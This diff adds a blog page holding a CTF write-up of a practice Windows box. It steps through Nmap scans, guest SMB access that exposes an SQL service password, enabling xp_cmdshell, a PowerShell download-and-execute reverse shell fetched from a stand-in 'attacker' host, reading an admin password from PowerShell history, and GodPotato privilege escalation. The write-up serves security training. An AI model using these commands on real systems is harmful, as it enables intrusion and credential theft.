@@ -1,0 +1,268 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Reab</title>
+    <link href="/static/favicon.ico" rel="icon"/>
+    <link href="/static/prism.css" rel="stylesheet"/>
+    <link href="/static/style.css" rel="stylesheet"/>
+</head>
+<body>
+
+<header>
+    <a href="/html/about.html"><img class="profile-pic" src="https://avatars.githubusercontent.com/u/122540000?v=4" alt="profile-pic"></a>
+    <a class="header" href="/html/about.html"><h1>Reab:~$<span class="cursor">▋</span></h1></a>
+    <div class="navs">
+        <h1><a class="header" href="/html/about.html">About</a></h1>
+        <h1><a class="header" href="/html/blog/index.html">Blog</a></h1>
+        <h1><a class="header" href="/html/personal/index.html">Personal</a></h1>
+        <h1><a class="header" href="/html/projects/index.html">Projects</a></h1>
+    </div>
+</header>
+
+<div class="global-content">
+<div class="inner-content">
+
+<!-- content start -->
+<h2>Preface</h2>
+
+<p>I approached this box as a boot to root style CTF.
+In this write up I step through my methodology and thought process behind it.</p>
+
+<h2>Active reconnaissance</h2>
+
+<p>After connecting to the VPN and waiting for the box server to start responding to my pings, it's ready for some enumeration.
+To start off, a fast Nmap <em>SYN</em> scan across the whole port range.
+<em>arch is set as hostname for target IP address in /etc/hosts</em></p>
+
+<pre><code class="ruby language-ruby">nmap -sS -T4 arch -p-
+
+Not shown: 65523 closed tcp ports (reset)
+PORT      STATE SERVICE
+
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+1433/tcp  open  ms-sql-s
+5985/tcp  open  wsman
+47001/tcp  open winrm
+</code></pre>
+
+<p>Based on the services running, looks like we are dealing with a windows OS.
+To get more detailed results on the services that responded, I ran the following Nmap command.
+It will run Nmap scripts for version detection and fingerprinting.</p>
+
+<pre><code class="ruby language-ruby">nmap -sC -sV arch $port_num
+
+PORT     STATE SERVICE  VERSION
+1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2026-04-27T11:25:10
+|_Not valid after:  2056-04-27T11:25:10
+| ms-sql-info:
+|   10.129.118.159:1433:
+|     Version:
+|       name: Microsoft SQL Server 2017 RTM
+|       number: 14.00.1000.00
+|       Product: Microsoft SQL Server 2017
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+| ms-sql-ntlm-info:
+|   10.129.118.159:1433:
+|     Target_Name: ARCHETYPE
+|     NetBIOS_Domain_Name: ARCHETYPE
+|     NetBIOS_Computer_Name: ARCHETYPE
+|     DNS_Domain_Name: Archetype
+|     DNS_Computer_Name: Archetype
+|_    Product_Version: 10.0.17763
+|_ssl-date: 2026-04-27T11:38:44+00:00; +2s from scanner time.
+</code></pre>
+
+<p>Based on the results for the service on port 1433, a lot of information can be used to our advantage.
+We got the server name, domain/DNS and computer name, software version.</p>
+
+<pre><code class="ruby language-ruby">PORT    STATE SERVICE      VERSION
+445/tcp open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
+Service Info: OS: Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-os-discovery:
+|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
+|   Computer name: Archetype
+|   NetBIOS computer name: ARCHETYPE\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2026-04-27T04:36:45-07:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-time:
+|   date: 2026-04-27T11:36:43
+|_  start_date: N/A
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled but not required
+|_clock-skew: mean: 2h20m03s, deviation: 4h02m31s, median: 1s
+</code></pre>
+
+<p>Same for the SMB results, a lot of useful information, and guest account is available most importantly.</p>
+
+<h2>SMB</h2>
+
+<p>Let's use the guest for SMB shares and see what is in there.</p>
+
+<pre><code class="ruby language-ruby">smbclient -L arch --no-pass 
+</code></pre>
+
+<p>Other than default shares there is a shared called <em>backups</em></p>
+
+<p>Time to explore what is in backups.</p>
+
+<pre><code class="ruby language-ruby">smbclient -U Archetype/guest //arch/backups
+</code></pre>
+
+<p>There is a file called <em>prod.dtsConfig</em> there might be some keys or secrets inside.</p>
+
+<pre><code class="ruby language-ruby">smb: \&gt; mget prod.dts.Config
+</code></pre>
+
+<p>Looks like we got a password and user ID for the SQL service running on this server.</p>
+
+<pre><code class="xml language-xml">&lt;DTSConfiguration&gt;
+    &lt;DTSConfigurationHeading&gt;
+        &lt;DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/&gt;
+    &lt;/DTSConfigurationHeading&gt;
+    &lt;Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String"&gt;
+        &lt;ConfiguredValue&gt;Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;&lt;/ConfiguredValue&gt;
+    &lt;/Configuration&gt;
+&lt;/DTSConfiguration&gt;
+</code></pre>
+
+<h2>MSSQL</h2>
+
+<p>To authenticate and interact with this SQL service I used mssqlclient.py (it's open source).</p>
+
+<pre><code class="ruby language-ruby">./mssqlclient.py WORKGROUP/sql_svc:M3g4c0rp123@arch -windows-auth
+</code></pre>
+
+<p>This lands you in a CLI environment that allows you manage this service.
+I've never had experience with this specifically, so I used basic commands like <em>help</em> and <em>ls</em> to see if I can get some sort of help or documentation for usage.
+At first it's a bit overwhelming with a big list of available commands, so I was focusing on only exploring certain subset of commands.</p>
+
+<hr />
+
+<p>Specifically commands that indicate that they have read or write or execute ability , for example reading sensitive files or writing to sensitive endpoints.
+In essence gaining as much leverage as possible using this service.</p>
+
+<p><img src="/static/sql_archetype_1.png" alt="screenshot here" /></p>
+
+<p>If you take a look at the list, there are couple of commands related to the shell and execution of commands, this is my first go-to as a low hanging fruit with maximum impact.
+In best case scenario this allows for RCE and initial low privilege shell access, or in other case maybe just a piece of the puzzle for later.</p>
+
+<hr />
+
+<p>At first I've tried to execute a shell command <em>xp_cmdshell whoami</em> but that resulted in an error, essentially telling me this functionality is disabled.
+Bummer.</p>
+
+<p>But oddly enough command <em>enable_xp_cmdshell</em> was available and allowed me to enable my previously failed command.
+After running that and enabling the command shell, message in stdout told me to run <em>RECONFIGURE</em> to apply the changes.</p>
+
+<hr />
+
+<p>This shell command is not literally shell execution, but more like a wrapper to call other binaries or scripts.
+One of many things that it lists as available via <em>help</em> is <em>CMD</em>.
+Description of that command is: <em>starts a new instance of the Windows command interpreter</em>.</p>
+
+<hr />
+
+<p>Now, from all the previous experience with Powershell and Command prompt I remembered that when invoking the interpreter binary you can supply a command to run as an argument.
+It works for both interpeters just different syntax.
+In this case for command prompt it's via <em>cmd /c 'whoami'</em> for example.</p>
+
+<p><img src="/static/sql_archetype_2.png" alt="screenshot here" /></p>
+
+<p>As you can tell in the screenshot, the commands output reflects the username, confirming the RCE in the command prompt context.
+To escalate this into a interactive shell, I needed to jam in a reverse shell command into this context.</p>
+
+<h2>Reverse shell</h2>
+
+<p>For the sake of my sanity and jank in CLI context, I decided to host the <em><a href="https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3">Powershell one-liner classic reverse shell</a></em> in a text file and fetch that string and execute it in Powershell.
+I had my python http server running.</p>
+
+<pre><code class="ruby language-ruby">python -m http.server 80
+</code></pre>
+
+<p>Netcat waiting for the reverse shell.</p>
+
+<pre><code class="ruby language-ruby">nc -nvlp 4444
+</code></pre>
+
+<p>And finally running the command to kick it off.</p>
+
+<pre><code class="shell language-shell">xp_cmdshell CMD /c "Powershell.exe -Command "iex ((New-Object System.Net.WebClient).DownloadString(\"http://attacker:80/pws.txt\"))""
+</code></pre>
+
+<p>In hindsight, I thing using more single quotes when doing things like this would save me headaches of escaping characters and possibly even going thru hell by having $something resolve as a variable not a literal dollar sign.</p>
+
+<p>Regardless of that, the reverse shell was successful.
+The flag is located in <em>user.txt</em> on Desktop of your current user.</p>
+
+<h2>Windows privilege escalation</h2>
+
+<p>If you recall from the first recon and enumeration from this box, we learned about the Windows server version, but now we can confirm it and more.
+For initial enumeration for potential escalation vectors I ran commands like:</p>
+
+<pre><code class="powershell language-powershell">PS C:\Windows\system32&gt; whoami /priv
+PS C:\Windows\system32&gt; systeminfo
+PS C:\Windows\system32&gt; type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
+</code></pre>
+
+<p>This will give you information about the OS, and the security patches installed.
+Also dumping the command line history could at least give you an indication of how this system is used or administered.
+Checking the privileges enabled for our user, we see our first potential vector <strong>seImpersonatePrivilege: Enabled</strong>.</p>
+
+<p>This privilege allows the user to impersonate other privilege levels as the name implies, and there is a family of exploits available that leverage this.
+Namely the potato family of exploits, and one similar called Print spool, but that one has some other requirements that I doubt our box meets.</p>
+
+<hr />
+
+<p>The command line history revealed a user <em>administrator</em> using the same backups SMB share from before and logging in with plaintext password.
+I didn't manage to find anything interesting in the SMB share, with the new account, but regardless we have the password, which we can utilize in a different way.</p>
+
+<p>I ended up using <a href="https://github.com/BeichenDream/GodPotato"><em>GodPotato</em></a> exploit to utilize the privileges and escalate, many others have failed to run.
+The process was relatively simple, I uploaded the executable to the windows host <em>Public</em> directory with <em>wget</em> and python http sever like I did for the initial shell.</p>
+
+<pre><code class="powershell language-powershell">./GodPotato.exe -cmd "cmd /c whoami"
+nt authority\system
+</code></pre>
+
+<p>Next i just grabbed the root flag and called it a day, using these exploits can often be finnicky so I didn't bother playing around more after all this.</p>
+
+<pre><code class="powershell language-powershell">./GodPotato.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\root.txt"
+</code></pre>
+
+<!-- content end -->
+
+</div></div>
+
+<footer>
+    <div class="socials">
+        <p class="faint">©2026 Author: Mihajlo Frančić<br>
+        <a class="email" href="mailto:mihajlofrancic@gmail.com">mihajlofrancic@gmail.com</a></p>
+    </div>
+    <div class="socials">
+        </a><a href=https://github.com/0Reab><img class="socials" src=https://cdn.simpleicons.org/github/dbdbdb>
+        </a><a href=https://www.linkedin.com/in/mihajlo-francic-3650682bb><img class="socials" src=https://img.icons8.com/?size=100&id=8808&format=png&color=FDFDFD class=inline style=width:17px;height:17px;>
+        </a><a href=https://www.instagram.com/astrosamihajlom/><img class="socials" src=https://cdn.simpleicons.org/instagram/dbdbdb class=inline>
+        </a><a href=https://app.intigriti.com/researcher/profile/reab><img class="socials" src=https://cdn.simpleicons.org/intigriti/ffffff class=inline>
+        </a><a href=https://www.openbugbounty.org/researchers/reab/><img class="socials" src=https://cdn.simpleicons.org/openbugbounty/dbdbdb class=inline>
+    </div>
+</footer>
+
+<script src="/js/prism.js"></script>
+<script src="/js/main.js"></script>
+</body>
+</html>
